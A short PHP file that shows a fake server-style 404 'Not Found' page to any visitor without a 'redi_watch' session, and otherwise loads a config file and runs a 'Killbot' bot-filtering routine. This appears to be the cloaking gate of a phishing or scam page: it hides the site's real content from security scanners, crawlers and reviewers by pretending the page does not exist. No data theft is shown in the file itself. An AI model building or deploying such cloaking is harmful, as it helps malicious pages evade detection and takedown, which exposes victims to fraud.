<?php

if (!isset($_SESSION['redi_watch'])) {
header("HTTP/1.0 404 Not Found");
exit("<h1>Not Found</h1>
The requested URL " . $_SERVER["REQUEST_URI"] . " was not found on this server.
<hr>");
}

require_once(__DIR__.'/../config.php');
require_once(__DIR__ . '/function.php');
$Killbot = new Killbot($CONFIG_KILLBOT);
$Killbot->run();